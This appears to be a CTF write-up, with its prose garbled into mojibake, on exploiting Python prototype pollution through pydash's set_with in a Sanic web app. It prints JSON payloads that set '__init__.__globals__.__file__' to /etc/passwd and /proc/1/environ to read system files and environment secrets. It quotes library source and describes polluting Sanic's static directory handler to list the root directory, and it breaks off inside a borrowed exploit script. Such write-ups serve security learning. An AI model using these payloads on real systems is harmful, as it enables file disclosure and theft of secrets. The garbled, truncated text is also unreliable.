`obj` is modified in place.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Example:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; set_with(&#123;&#125;, &#x27;[0][1]&#x27;, &#x27;a&#x27;, lambda: &#123;&#125;)</span></span><br><span class="line"><span class="string">        &#123;0: &#123;1: &#x27;a&#x27;&#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionadded:: 4.0.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionchanged:: 4.3.1</span></span><br><span class="line"><span class="string">        Fixed bug where a callable `value` was called when being set.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> update_with(obj, path, pyd.constant(value), customizer=customizer)</span><br></pre></td></tr></table></figure><p>â€‹ç›¯ç€ pathï¼Œç»§ç»­è·Ÿè¿›ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">update_with</span>(<span class="params">obj, path, updater, customizer=<span class="literal">None</span></span>):  <span class="comment"># noqa: C901</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    This method is like :func:`update` except that it accepts customizer which is invoked to produce</span></span><br><span class="line"><span class="string">    the objects of path. If customizer returns ``None``, path creation is handled by the method</span></span><br><span class="line"><span class="string">    instead. The customizer is invoked with three arguments: ``(nested_value, key, nested_object)``.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        obj (list|dict): Object to modify.</span></span><br><span class="line"><span class="string">        path (str|list): A string or list of keys that describe the object path to modify.</span></span><br><span class="line"><span class="string">        updater (callable): Function that returns updated value.</span></span><br><span class="line"><span class="string">        customizer (callable, optional): The function to customize assigned values.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        mixed: Updated `obj`.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Warning:</span></span><br><span class="line"><span class="string">        `obj` is modified in place.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Example:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; update_with(&#123;&#125;, &#x27;[0][1]&#x27;, lambda: &#x27;a&#x27;, lambda: &#123;&#125;)</span></span><br><span class="line"><span class="string">        &#123;0: &#123;1: &#x27;a&#x27;&#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionadded:: 4.0.0</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">callable</span>(updater):</span><br><span class="line">        updater = pyd.constant(updater)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> customizer <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> <span class="keyword">not</span> <span class="built_in">callable</span>(customizer):</span><br><span class="line">        call_customizer = partial(callit, clone, customizer, argcount=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">elif</span> customizer:</span><br><span class="line">        call_customizer = partial(callit, customizer, argcount=getargcount(customizer, maxargs=<span class="number">3</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        call_customizer = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    default_type = <span class="built_in">dict</span> <span class="keyword">if</span> <span class="built_in">isinstance</span>(obj, <span class="built_in">dict</span>) <span class="keyword">else</span> <span class="built_in">list</span></span><br><span class="line">    tokens = to_path_tokens(path)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> pyd.is_list(tokens):  <span class="comment"># pragma: no cover</span></span><br><span class="line">        tokens = [tokens]</span><br><span class="line"></span><br><span class="line">    last_key = pyd.last(tokens)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(last_key, PathToken):</span><br><span class="line">        last_key = last_key.key</span><br><span class="line"></span><br><span class="line">    target = obj</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> idx, token <span class="keyword">in</span> <span class="built_in">enumerate</span>(pyd.initial(tokens)):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(token, PathToken):</span><br><span class="line">            key = token.key</span><br><span class="line">            default_factory = pyd.get(tokens, [idx + <span class="number">1</span>, <span class="string">&quot;default_factory&quot;</span>], default=default_type)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            key = token</span><br><span class="line">            default_factory = default_type</span><br><span class="line"></span><br><span class="line">        obj_val = base_get(target, key, default=<span class="literal">None</span>)</span><br><span class="line">        path_obj = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> call_customizer:</span><br><span class="line">            path_obj = call_customizer(obj_val, key, target)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> path_obj <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            path_obj = default_factory()</span><br><span class="line"></span><br><span class="line">        base_set(target, key, path_obj, allow_override=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            target = base_get(target, key, default=<span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">except</span> TypeError <span class="keyword">as</span> exc:  <span class="comment"># pragma: no cover</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                target = target[<span class="built_in">int</span>(key)]</span><br><span class="line">                _failed = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                _failed = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> _failed:</span><br><span class="line">                <span class="keyword">raise</span> TypeError(<span class="string">f&quot;Unable to update object at index <span class="subst">&#123;key!r&#125;</span>. <span class="subst">&#123;exc&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    value = base_get(target, last_key, default=<span class="literal">None</span>)</span><br><span class="line">    base_set(target, last_key, callit(updater, value))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> obj</span><br></pre></td></tr></table></figure><p>â€‹ç»§ç»­è·Ÿè¿› pathï¼Œä¼¼ä¹æ•´ä¸ªå‡½æ•°é‡Œå°±åªæœ‰ä¸€ä¸ªï¼š <code>tokens = to_path_tokens(path)</code> ï¼Œè¿˜æ˜¯æ— è„‘æ ¹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">to_path_tokens</span>(<span class="params">value</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Parse `value` into :class:`PathToken` objects.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> pyd.is_string(value) <span class="keyword">and</span> (<span class="string">&quot;.&quot;</span> <span class="keyword">in</span> value <span class="keyword">or</span> <span class="string">&quot;[&quot;</span> <span class="keyword">in</span> value):</span><br><span class="line">        <span class="comment"># Since we can&#x27;t tell whether a bare number is supposed to be dict key or a list index, we</span></span><br><span class="line">        <span class="comment"># support a special syntax where any string-integer surrounded by brackets is treated as a</span></span><br><span class="line">        <span class="comment"># list index and converted to an integer.</span></span><br><span class="line">        keys = [</span><br><span class="line">            PathToken(<span class="built_in">int</span>(key[<span class="number">1</span>:-<span class="number">1</span>]), default_factory=<span class="built_in">list</span>)</span><br><span class="line">            <span class="keyword">if</span> RE_PATH_LIST_INDEX.<span class="keyword">match</span>(key)</span><br><span class="line">            <span class="keyword">else</span> PathToken(unescape_path_key(key), default_factory=<span class="built_in">dict</span>)</span><br><span class="line">            <span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, RE_PATH_KEY_DELIM.split(value))</span><br><span class="line">        ]</span><br><span class="line">    <span class="keyword">elif</span> pyd.is_string(value) <span class="keyword">or</span> pyd.is_number(value):</span><br><span class="line">        keys = [PathToken(value, default_factory=<span class="built_in">dict</span>)]</span><br><span class="line">    <span class="keyword">elif</span> value <span class="keyword">is</span> UNSET:</span><br><span class="line">        keys = []</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        keys = value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> keys</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>â€‹è¿™å„¿ä¸çŸ¥é“æ€ä¹ˆæ“ä½œäº†ï¼Œä½†æ˜¯è·Ÿè¿›  <code>RE_PATH_KEY_DELIM</code>  åå¾—åˆ°äº†ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RE_PATH_KEY_DELIM = re.<span class="built_in">compile</span>(<span class="string">r&quot;(?&lt;!\\)(?:\\\\)*\.|(\[\d+\])&quot;</span>)</span><br></pre></td></tr></table></figure><p>â€‹é—®äº†ä¸‹ aiï¼Œai çš„å›å¤ä¸­æœ‰ä¸€ç‚¹å„¿å€¼å¾—æ³¨æ„ï¼š</p><blockquote><p>è¯·æ³¨æ„ï¼Œè¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼åœ¨å¤„ç†å¤æ‚çš„è½¬ä¹‰åºåˆ—æ—¶å¯èƒ½ä¸æ˜¯å®Œç¾çš„ï¼Œç‰¹åˆ«æ˜¯å½“å­—ç¬¦ä¸²ä¸­åŒ…å«è¿ç»­çš„è½¬ä¹‰å­—ç¬¦ï¼ˆå¦‚  <code>\\\\.</code> ï¼‰ï¼Œè¿™äº›å­—ç¬¦å¯èƒ½æ„å›¾è¡¨ç¤ºä¸€ä¸ªå®é™…çš„ç‚¹å·ä½†å‰é¢æœ‰å¶æ•°ä¸ªåæ–œæ ã€‚æ­¤å¤–ï¼Œå¦‚æœç‚¹å·åé¢ç´§è·Ÿçš„æ˜¯å­—æ¯æˆ–å…¶ä»–éæ•°å­—å­—ç¬¦ï¼Œå®ƒä»ç„¶ä¼šè¢«åŒ¹é…ä¸ºåˆ†éš”ç¬¦ï¼Œå³ä½¿è¿™å¯èƒ½ä¸æ˜¯é¢„æœŸçš„ã€‚</p></blockquote><p>â€‹æˆ‘ä¸ªäººå·²ç»åˆ«æ— ä»–æ³•äº†ï¼Œç…§ç€å®ƒç»™çš„è¿™ä¸ªè¿™ <code>\\\\.</code>  è¯•ç€ç»•äº†ä¸€ä¸‹ï¼Œç»“æœæˆåŠŸäº†ï¼Œpayload å¦‚ä¸‹ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;key&quot;</span>  <span class="punctuation">:</span> <span class="string">&quot;__init__\\\\.__globals__\\\\.__file__&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;value&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;/etc/passwd&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹è®¿é—® src è·¯ç”±ï¼ŒæˆåŠŸè¯»å–åˆ°äº†æ–‡ä»¶ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/550d038c156f4d6b8438ed492ff66ab8.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹å¥½äº†ï¼Œç…§ç†æ¥è¯´ï¼Œè¿™ä¸ªé¢˜ç›®å¦‚æœè¿™æ ·çš„è¯å·²ç»æˆåŠŸäº†ï¼Œåˆ©ç”¨å¦‚ä¸‹ payload ç›´æ¥è¯»å–è¿›ç¨‹çš„ç¯å¢ƒå˜é‡å³å¯ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;key&quot;</span>  <span class="punctuation">:</span> <span class="string">&quot;__init__\\\\.__globals__\\\\.__file__&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;value&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;/proc/1/environ&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img data-src="https://i-blog.csdnimg.cn/direct/a9da93b14d1f46dba7baadaca4c8ba51.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹ä½†æ˜¯ï¼Œçœ‹äº†ä¸‹å¤§ä½¬ä»¬çš„ wp ä¼¼ä¹æœ‰å¦ä¸€ç§å§¿åŠ¿ï¼Œç®—æ˜¯ä¸€ç§éé¢„æœŸå§ã€‚</p><p><strong>ä¸‹é¢è·Ÿç€å¤§ä½¬ä»¬èµ°ï¼š</strong></p><p>â€‹å…ˆçœ‹å¦‚ä¸‹ä½ç½®ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line">Session(app)</span><br></pre></td></tr></table></figure><p>â€‹è·Ÿè¿› static ()ï¼Œå¾—åˆ°å¦‚ä¸‹å†…å®¹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">static</span>(<span class="params"></span></span><br><span class="line"><span class="params">    self,</span></span><br><span class="line"><span class="params">    uri: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    file_or_directory: <span class="type">Union</span>[PathLike, <span class="built_in">str</span>],</span></span><br><span class="line"><span class="params">    pattern: <span class="built_in">str</span> = <span class="string">r&quot;/?.+&quot;</span>,</span></span><br><span class="line"><span class="params">    use_modified_since: <span class="built_in">bool</span> = <span class="literal">True</span>,</span></span><br><span class="line"><span class="params">    use_content_range: <span class="built_in">bool</span> = <span class="literal">False</span>,</span></span><br><span class="line"><span class="params">    stream_large_files: <span class="type">Union</span>[<span class="built_in">bool</span>, <span class="built_in">int</span>] = <span class="literal">False</span>,</span></span><br><span class="line"><span class="params">    name: <span class="built_in">str</span> = <span class="string">&quot;static&quot;</span>,</span></span><br><span class="line"><span class="params">    host: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    strict_slashes: <span class="type">Optional</span>[<span class="built_in">bool</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    content_type: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    apply: <span class="built_in">bool</span> = <span class="literal">True</span>,</span></span><br><span class="line"><span class="params">    resource_type: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    index: <span class="type">Optional</span>[<span class="type">Union</span>[<span class="built_in">str</span>, <span class="type">Sequence</span>[<span class="built_in">str</span>]]] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    directory_view: <span class="built_in">bool</span> = <span class="literal">False</span>,</span></span><br><span class="line"><span class="params">    directory_handler: <span class="type">Optional</span>[DirectoryHandler] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params"></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Register a root to serve files from. The input can either be a file or a directory.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    This method provides an easy and simple way to set up the route necessary to serve static files.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        uri (str): URL path to be used for serving static content.</span></span><br><span class="line"><span class="string">        file_or_directory (Union[PathLike, str]): Path to the static file</span></span><br><span class="line"><span class="string">            or directory with static files.</span></span><br><span class="line"><span class="string">        pattern (str, optional): Regex pattern identifying the valid</span></span><br><span class="line"><span class="string">            static files. Defaults to `r&quot;/?.+&quot;`.</span></span><br><span class="line"><span class="string">        use_modified_since (bool, optional): If true, send file modified</span></span><br><span class="line"><span class="string">            time, and return not modified if the browser&#x27;s matches the</span></span><br><span class="line"><span class="string">            server&#x27;s. Defaults to `True`.</span></span><br><span class="line"><span class="string">        use_content_range (bool, optional): If true, process header for</span></span><br><span class="line"><span class="string">            range requests and sends  the file part that is requested.</span></span><br><span class="line"><span class="string">            Defaults to `False`.</span></span><br><span class="line"><span class="string">        stream_large_files (Union[bool, int], optional): If `True`, use</span></span><br><span class="line"><span class="string">            the `StreamingHTTPResponse.file_stream` handler rather than</span></span><br><span class="line"><span class="string">            the `HTTPResponse.file handler` to send the file. If this</span></span><br><span class="line"><span class="string">            is an integer, it represents the threshold size to switch</span></span><br><span class="line"><span class="string">            to `StreamingHTTPResponse.file_stream`. Defaults to `False`,</span></span><br><span class="line"><span class="string">            which means that the response will not be streamed.</span></span><br><span class="line"><span class="string">        name (str, optional): User-defined name used for url_for.</span></span><br><span class="line"><span class="string">            Defaults to `&quot;static&quot;`.</span></span><br><span class="line"><span class="string">        host (Optional[str], optional): Host IP or FQDN for the</span></span><br><span class="line"><span class="string">            service to use.</span></span><br><span class="line"><span class="string">        strict_slashes (Optional[bool], optional): Instruct Sanic to</span></span><br><span class="line"><span class="string">            check if the request URLs need to terminate with a slash.</span></span><br><span class="line"><span class="string">        content_type (Optional[str], optional): User-defined content type</span></span><br><span class="line"><span class="string">            for header.</span></span><br><span class="line"><span class="string">        apply (bool, optional): If true, will register the route</span></span><br><span class="line"><span class="string">            immediately. Defaults to `True`.</span></span><br><span class="line"><span class="string">        resource_type (Optional[str], optional): Explicitly declare a</span></span><br><span class="line"><span class="string">            resource to be a `&quot;file&quot;` or a `&quot;dir&quot;`.</span></span><br><span class="line"><span class="string">        index (Optional[Union[str, Sequence[str]]], optional): When</span></span><br><span class="line"><span class="string">            exposing against a directory, index is  the name that will</span></span><br><span class="line"><span class="string">            be served as the default file. When multiple file names are</span></span><br><span class="line"><span class="string">            passed, then they will be tried in order.</span></span><br><span class="line"><span class="string">        directory_view (bool, optional): Whether to fallback to showing</span></span><br><span class="line"><span class="string">            the directory viewer when exposing a directory. Defaults</span></span><br><span class="line"><span class="string">            to `False`.</span></span><br><span class="line"><span class="string">        directory_handler (Optional[DirectoryHandler], optional): An</span></span><br><span class="line"><span class="string">            instance of DirectoryHandler that can be used for explicitly</span></span><br><span class="line"><span class="string">            controlling and subclassing the behavior of the default</span></span><br><span class="line"><span class="string">            directory handler.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        List[sanic.router.Route]: Routes registered on the router.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Examples:</span></span><br><span class="line"><span class="string">        Serving a single file:</span></span><br><span class="line"><span class="string">        ```python</span></span><br><span class="line"><span class="string">        app.static(&#x27;/foo&#x27;, &#x27;path/to/static/file.txt&#x27;)</span></span><br></pre></td></tr></table></figure><pre><code>        Serving all files from a directory:        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.static(<span class="string">&#x27;/static&#x27;</span>, <span class="string">&#x27;path/to/static/directory&#x27;</span>)</span><br></pre></td></tr></table></figure>        Serving large files with a specific threshold:        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.static(<span class="string">&#x27;/static&#x27;</span>, <span class="string">&#x27;path/to/large/files&#x27;</span>, stream_large_files=<span class="number">1000000</span>)</span><br></pre></td></tr></table></figure>    &quot;&quot;&quot;  # noqa: E501    name = self.generate_name(name)    if strict_slashes is None and self.strict_slashes is not None:        strict_slashes = self.strict_slashes    if not isinstance(file_or_directory, (str, bytes, PurePath)):        raise ValueError(            f&quot;Static route must be a valid path, not &#123;file_or_directory&#125;&quot;        )    try:        file_or_directory = Path(file_or_directory).resolve()    except TypeError:        raise TypeError(            &quot;Static file or directory must be a path-like object or string&quot;        )    if directory_handler and (directory_view or index):        raise ValueError(            &quot;When explicitly setting directory_handler, you cannot &quot;            &quot;set either directory_view or index. Instead, pass &quot;            &quot;these arguments to your DirectoryHandler instance.&quot;        )    if not directory_handler:        directory_handler = DirectoryHandler(            uri=uri,            directory=file_or_directory,            directory_view=directory_view,            index=index,        )    static = FutureStatic(        uri,        file_or_directory,        pattern,        use_modified_since,        use_content_range,        stream_large_files,        name,        host,        strict_slashes,        content_type,        resource_type,        directory_handler,    )    self._future_statics.add(static)    if apply:        self._apply_static(static)</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">â€‹æ³¨é‡Šé‡Œé¢å­˜åœ¨è¿™ä¸¤å¥è¯ï¼š</span><br><span class="line"></span><br><span class="line">```tex</span><br><span class="line">            directory_view (bool, optional): Whether to fallback to showing</span><br><span class="line">                the directory viewer when exposing a directory. Defaults</span><br><span class="line">                to `False`.</span><br><span class="line">            directory_handler (Optional[DirectoryHandler], optional): An</span><br><span class="line">                instance of DirectoryHandler that can be used for explicitly</span><br><span class="line">                controlling and subclassing the behavior of the default</span><br><span class="line">                directory handler.</span><br></pre></td></tr></table></figure><p>â€‹å¤§è‡´æ„æ€å°±æ˜¯ directory_view ä¸º True æ—¶ï¼Œä¼šå¼€å¯åˆ—ç›®å½•åŠŸèƒ½ï¼Œdirectory_handler ä¸­å¯ä»¥è·å–æŒ‡å®šçš„ç›®å½•ã€‚è·Ÿè¿›ä¸‹ <code>directory_handler</code>  ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> directory_handler:</span><br><span class="line">    directory_handler = DirectoryHandler(</span><br><span class="line">        uri=uri,</span><br><span class="line">        directory=file_or_directory,</span><br><span class="line">        directory_view=directory_view,</span><br><span class="line">        index=index,</span><br><span class="line">    )</span><br></pre></td></tr></table></figure><p>â€‹å†è·Ÿè¿› <code>DirectoryHandler</code> ï¼Œå‘ç°å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params"></span></span><br><span class="line"><span class="params">        self,</span></span><br><span class="line"><span class="params">        uri: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">        directory: Path,</span></span><br><span class="line"><span class="params">        directory_view: <span class="built_in">bool</span> = <span class="literal">False</span>,</span></span><br><span class="line"><span class="params">        index: <span class="type">Optional</span>[<span class="type">Union</span>[<span class="built_in">str</span>, <span class="type">Sequence</span>[<span class="built_in">str</span>]]] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    </span>) -&gt; <span class="literal">None</span>:</span><br></pre></td></tr></table></figure><p>â€‹æˆ‘ä»¬å‘ç°åªè¦æˆ‘ä»¬å°† directory æ±¡æŸ“ä¸ºæ ¹ç›®å½•ï¼Œdirectory_view æ±¡æŸ“ä¸º Trueï¼Œå°±å¯ä»¥çœ‹åˆ°æ ¹ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶äº†ã€‚</p><p><strong>åç»­æˆ‘åœ¨ Windows ä¸Šæµ‹è¯•æ¬¡æ¬¡è¿è¡Œä¸äº†ï¼Œè¿™é‡Œå°±ç›´æ¥å€Ÿä¸€ä¸‹å¤§ä½¬ä»¬çš„ä»£ç åœ¨è¿™å„¿ï¼Œæˆ‘å°±ä¸å®æ“äº†</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span 